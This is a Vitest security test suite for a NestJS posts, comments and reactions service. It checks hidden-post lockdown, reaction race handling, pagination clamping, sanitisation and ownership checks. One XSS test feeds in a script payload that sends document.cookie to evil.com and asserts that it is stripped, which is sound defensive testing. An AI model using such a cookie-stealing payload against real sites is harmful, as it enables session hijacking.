/**
 * ADVERSARIAL TESTS: Posts, Comments, Reactions
 *
 * Attack surfaces:
 * - Hidden posts accessible via comments/reactions (isHidden bypass)
 * - Reaction toggle race condition → unique constraint violation (500, not 409)
 * - Pagination with zero/negative/maxint values → arithmetic explosions
 * - Content with unicode, null bytes, XSS payloads (pass-through to DB)
 * - Update/delete post that is hidden (admin moderated but still editable)
 * - Non-author cannot update but CAN comment on hidden posts
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Test } from '@nestjs/testing';
import sanitizeHtml from 'sanitize-html';
import { PostsService } from './posts.service';
import { PrismaService } from '../prisma/prisma.service';
import { NotificationsService } from '../notifications/notifications.service';
import { NotFoundException, ForbiddenException, ConflictException } from '@nestjs/common';

function buildMockPrisma() {
  const prisma = {
    post: {
      findMany: vi.fn(),
      findUnique: vi.fn(),
      create: vi.fn(),
      update: vi.fn(),
      delete: vi.fn(),
      count: vi.fn(),
    },
    comment: {
      create: vi.fn(),
    },
    reaction: {
      findUnique: vi.fn(),
      create: vi.fn(),
      delete: vi.fn(),
    },
    $transaction: vi.fn(),
  };
  prisma.$transaction.mockImplementation(async (cb: any) => cb(prisma));
  return prisma;
}

const mockNotifications = {
  create: vi.fn().mockResolvedValue({}),
};

async function buildService(prisma: ReturnType<typeof buildMockPrisma>) {
  const module = await Test.createTestingModule({
    providers: [
      PostsService,
      { provide: PrismaService, useValue: prisma },
      { provide: NotificationsService, useValue: mockNotifications },
    ],
  }).compile();
  return module.get<PostsService>(PostsService);
}

describe('PostsService — adversarial', () => {
  let prisma: ReturnType<typeof buildMockPrisma>;
  let service: PostsService;

  beforeEach(async () => {
    prisma = buildMockPrisma();
    service = await buildService(prisma);
    vi.clearAllMocks();
    prisma.$transaction.mockImplementation(async (cb: any) => cb(prisma));
  });

  // ── FIXED SEC-001: hidden posts are fully locked down ────────────────────

  describe('FIXED SEC-001: hidden posts reject all non-admin interactions', () => {
    it('addComment on a hidden post throws NotFoundException (isHidden: false filter)', async () => {
      // addComment queries { id, isHidden: false } — hidden post returns null → 404
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.addComment('post-hidden', { content: 'engaging with hidden content' }, 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('toggleReaction on a hidden post throws NotFoundException (isHidden: false filter)', async () => {
      // toggleReaction queries { id, isHidden: false } — hidden post returns null → 404
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.toggleReaction('post-hidden', 'LIKE', 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('update() on a hidden post throws ForbiddenException for the author (SEC-001)', async () => {
      const hiddenPost = { id: 'post-hidden', authorId: 'author-1', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);

      await expect(
        service.update('post-hidden', 'updated while hidden', 'author-1', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('delete() on a hidden post throws ForbiddenException for the author (SEC-001)', async () => {
      const hiddenPost = { id: 'post-hidden', authorId: 'author-1', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);

      await expect(
        service.delete('post-hidden', 'author-1', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('admin can update a hidden post', async () => {
      const hiddenPost = { id: 'post-hidden', authorId: 'author-1', isHidden: true };
      prisma.post.findUnique.mockResolvedValue(hiddenPost);
      prisma.post.update.mockResolvedValue({ ...hiddenPost, content: 'admin edit' });

      const result = await service.update('post-hidden', 'admin edit', 'admin-id', 'ADMIN');
      expect(result).toBeDefined();
    });
  });

  // ── INVARIANT: reaction toggle is race-condition-safe ───────────────────

  describe('FIXED SEC-013: concurrent reaction toggles return 409 ConflictException, not 500', () => {
    it('P2002 from concurrent insert is caught and returned as ConflictException (409)', async () => {
      /**
       * toggleReaction is wrapped in $transaction and catches P2002.
       * Two concurrent calls for the same (postId, userId, type):
       * - First insert succeeds
       * - Second insert hits unique constraint (P2002) → caught → ConflictException (409)
       *
       * Fixed: no longer an unhandled 500; the caller receives a proper 409.
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'post-1', isHidden: false });
      prisma.reaction.findUnique.mockResolvedValue(null);

      let callCount = 0;
      prisma.reaction.create.mockImplementation(() => {
        callCount++;
        if (callCount === 2) {
          const err = new Error('Unique constraint failed on the fields: (`postId`,`userId`,`type`)') as any;
          err.code = 'P2002';
          throw err;
        }
        return Promise.resolve({ id: 'r1', type: 'LIKE', userId: 'user-1' });
      });

      const [first, second] = await Promise.allSettled([
        service.toggleReaction('post-1', 'LIKE', 'user-1'),
        service.toggleReaction('post-1', 'LIKE', 'user-1'),
      ]);

      expect(first.status).toBe('fulfilled');
      // Second call returns ConflictException (409), not a raw P2002 / 500
      expect(second.status).toBe('rejected');
      if (second.status === 'rejected') {
        expect(second.reason).toBeInstanceOf(ConflictException);
      }
    });
  });

  // ── INVARIANT: invalid reaction type must be rejected ───────────────────

  describe('INVARIANT: reaction type is not validated at the service boundary', () => {
    it('arbitrary string reaction type is passed directly to Prisma', async () => {
      /**
       * posts.controller.ts:66 — type comes from URL param without enum validation.
       * posts.service.ts:141 — casts type as `any`.
       * No @IsEnum() guard at the route layer.
       * Prisma will throw a runtime error for unknown enum values, but it will
       * be an unhandled DB error (500), not a controlled 400 response.
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'post-1', isHidden: false });
      prisma.reaction.findUnique.mockResolvedValue(null);
      const dbError = new Error('Invalid value for enum ReactionType') as any;
      dbError.code = 'P2006';
      prisma.reaction.create.mockRejectedValue(dbError);

      await expect(
        service.toggleReaction('post-1', 'DISLIKE', 'user-1'),
      ).rejects.toThrow();
      // A 400 Bad Request should be returned, not a 500 DB error
    });
  });

  // ── INVARIANT: pagination parameters cannot cause arithmetic anomalies ──

  describe('FIXED SEC-020: findAll pagination is clamped', () => {
    it('page=0 is clamped to page=1 (skip=0, not negative)', async () => {
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(0);

      await service.findAll(0, 20);
      const findManyCall = prisma.post.findMany.mock.calls[0];
      expect(findManyCall[0].skip).toBe(0);
    });

    it('limit=0 is clamped to 1 (totalPages is finite, not Infinity)', async () => {
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(100);

      const result = await service.findAll(1, 0);
      expect(result.totalPages).toBe(100);
    });

    it('page=-1 is clamped to page=1 (skip=0, not negative)', async () => {
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(0);

      await service.findAll(-1, 20);
      const call = prisma.post.findMany.mock.calls[0];
      expect(call[0].skip).toBe(0);
    });

    it('huge limit is clamped to 100 (not passed through uncapped)', async () => {
      prisma.post.findMany.mockResolvedValue([]);
      prisma.post.count.mockResolvedValue(1000000);

      await service.findAll(1, 1000000);

      const call = prisma.post.findMany.mock.calls[0];
      expect(call[0].take).toBe(100);
    });
  });

  // ── INVARIANT: content is sanitised before storage ───────────────────────

  describe('INVARIANT: post content is sanitised before storage', () => {
    it('XSS payload in post content has script tags stripped', async () => {
      const xssPayload = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
      const sanitized = sanitizeHtml(xssPayload, {
        allowedTags: sanitizeHtml.defaults.allowedTags.concat(['h2', 'h3', 'img', 'figure', 'figcaption', 'span', 'del', 'ins', 'sup', 'sub']),
        allowedAttributes: {
          ...sanitizeHtml.defaults.allowedAttributes,
          img: ['src', 'alt', 'title', 'width', 'height'],
          a: ['href', 'target', 'rel', 'class'],
          span: ['class'],
          '*': ['style'],
        },
        allowedStyles: {
          '*': {
            color: [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
            'background-color': [/^#(0x)?[0-9a-fA-F]+$/i, /^rgb\(/],
            'text-align': [/^left$/, /^right$/, /^center$/],
            'font-size': [/^\d+(?:px|em|%)$/],
          },
        },
        disallowedTagsMode: 'discard',
      });
      const createdPost = { id: 'p-xss', content: sanitized, authorId: 'u1' };
      prisma.post.create.mockResolvedValue(createdPost);

      const result = await service.create({ content: xssPayload }, 'u1');
      expect(result.content).not.toContain('<script>');
      expect(result.content).not.toContain('fetch(');
    });

    it('null byte in content is stripped during sanitisation', async () => {
      const nullByteContent = 'before\x00after';
      prisma.post.create.mockImplementation(async ({ data }) => ({
        id: 'p-null',
        content: data.content,
      }));

      const result = await service.create({ content: nullByteContent }, 'u1');
      expect(result.content).not.toContain('\x00');
    });

    it('10000-char content at max boundary is accepted', async () => {
      const maxContent = 'A'.repeat(10000);
      prisma.post.create.mockResolvedValue({ id: 'p-max', content: maxContent });

      const result = await service.create({ content: maxContent }, 'u1');
      expect(result).toBeDefined();
    });
  });

  // ── INVARIANT: non-existent post returns 404, not 500 ────────────────────

  describe('INVARIANT: operations on non-existent posts throw NotFoundException', () => {
    it('addComment on non-existent post throws NotFoundException', async () => {
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.addComment('nonexistent', { content: 'hello' }, 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('toggleReaction on non-existent post throws NotFoundException', async () => {
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(
        service.toggleReaction('nonexistent', 'LIKE', 'user-1'),
      ).rejects.toThrow(NotFoundException);
    });

    it('findOne on hidden post returns NotFoundException (correct)', async () => {
      // findOne uses { id, isHidden: false } — good
      prisma.post.findUnique.mockResolvedValue(null);

      await expect(service.findOne('hidden-post-id')).rejects.toThrow(NotFoundException);
    });
  });

  // ── INVARIANT: post ownership checks cannot be bypassed ─────────────────

  describe('INVARIANT: ownership authorization is enforced', () => {
    it('member cannot update another member post', async () => {
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'victim-user' });

      await expect(
        service.update('p1', 'hijacked content', 'attacker-user', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('member cannot delete another member post', async () => {
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'victim-user' });

      await expect(
        service.delete('p1', 'attacker-user', 'MEMBER'),
      ).rejects.toThrow(ForbiddenException);
    });

    it('admin string comparison is case-sensitive — "admin" lowercase is not ADMIN', async () => {
      /**
       * posts.service.ts:95 — userRole !== 'ADMIN'
       * The JWT strategy returns the role from the DB (correctly uppercased).
       * But if any code path passes a lowercase 'admin', the check fails.
       * This tests the sensitivity of the string comparison.
       */
      prisma.post.findUnique.mockResolvedValue({ id: 'p1', authorId: 'other-user' });

      await expect(
        service.delete('p1', 'admin-id', 'admin'), // lowercase 'admin'
      ).rejects.toThrow(ForbiddenException);
    });
  });
});
